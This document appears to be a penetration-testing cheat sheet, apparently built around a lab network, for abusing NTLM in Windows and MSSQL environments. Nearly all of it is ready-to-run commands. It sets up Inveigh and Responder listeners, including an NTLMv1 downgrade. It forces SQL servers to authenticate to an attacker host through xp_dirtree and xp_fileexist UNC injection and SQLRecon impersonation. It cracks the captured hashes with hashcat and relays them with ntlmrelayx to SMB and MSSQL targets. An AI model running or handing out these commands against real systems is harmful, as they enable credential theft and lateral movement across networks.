# NTLM Abuse

## Resources

- https://github.com/NetSPI/PowerUpSQL/wiki/SQL-Server---UNC-Path-Injection-Cheat-Sheet


# Hash Capture
## Listener Setup
### Windows

```PowerShell
# Ensure running as administrator
# For best results disable listener host firewall
Invoke-Inveigh -IP 192.168.203.10 -NBNS Y -ConsoleOutput Y
Inveigh.exe
```
### Linux
```bash
# Standard Execute
sudo responder -I tun0

# If attempting NTLMv1 downgrade
sudo nano /usr/share/responder/Responder.conf

# <-- Snip -->
# ; Custom challenge.
# ; Use "Random" for generating a random challenge for each requests (Default)
# Challenge = 1122334455667788

```
## Perform Coercion
### Windows
If Invoking Inveigh within PowerUpSQL use the command below.
```poweshell
Invoke-SQLUncPathInjection -Verbose -CaptureIp "192.168.234.10" | Select-Object NetNTLMv2, NetNTLMv1, Cleartext | Format-Table -AutoSize -Wrap | Tee-Object $HOME\CapturedUNC.txt -Encoding "ASCII"
```
Otherwise, a more manual approach can be taken when using Inveigh in a seperate console window or using a different listener such as Responder or ntlmrelayx.

```powershell
Get-SQLInstanceDomain -verbose | Get-SQLQuery -TimeOut 20 -Query "xp_dirtree '\\192.168.203.10\NOT_A_REAL_SHARE'" -Verbose | out-null
Get-SQLInstanceDomain -verbose | Get-SQLQuery -TimeOut 20 -Query "xp_fileexist  '\\192.168.203.10\NOT_A_REAL_SHARE'" -Verbose | out-null
```

### SQLRecon
```powershell
.\SQLRecon.exe /a:WinToken /h:DC01 /m:smb /unc:\\192.168.45.223\NOT_A_REAL_SHARE
.\SQLRecon.exe /a:WinToken /h:DC01 /m:impersonate /i:sa /m:smb /unc:\\192.168.45.223\NOT_A_REAL_SHARE
```
### Linux
```
mssqlclient.py -dc-ip 192.168.203.10 corp1.com/offsec:lab@192.168.203.6 -windows-auth
SQL> EXEC xp_dirtree '\\192.168.45.223\NOT_A_REAL_SHARE';
SQL> EXEC xp_fileexist '\\192.168.45.223\NOT_A_REAL_SHARE';
```

## Hash Cracking
```bash
# NTLMv2
hashcat -m 5600 -a 0 -O Hashes\NTLMv2.txt Wordlists\rockyou.txt -r rules\Best64.rule

# NTLMv1
hashcat -m 5500 -a 0 -O Hashes\NTLMv2.txt Wordlists\rockyou.txt -r rules\Best64.rule
```

# Hash Relaying
## SMB Relaying
### Windows
```
.\divertTCPConn.exe 445 8445
.\ntlmrelayx.exe -t smb://192.168.203.6 --no-http-server -smb2support --smb-port 8445
```

### Linux
```
ntlmrelayx.py -t smb://192.168.203.6 --no-http-server -smb2support
```
## MSSQL Relaying
### Windows
```powershell
# Not sure if there is a windows solution as ntlmrelayx.exe has an
# issue with SSL protocols on Windows with MSSQL relaying :(
```
### Linux
```python
# Simple MSSQL query
ntlmrelayx.py -t mssql://192.168.203.5 -i --no-http-server -smb2support -q "select @@version;' -q ' select user_name();"

# We can even go deeper and relay to MSSQL and perform an additional UNC path injection command on the target system
ntlmrelayx.py -t mssql://192.168.203.6 --no-http-server -smb2support -q "EXEC xp_dirtree '\\\\192.168.45.223\NOT_A_REAL_SHARE';" 
```
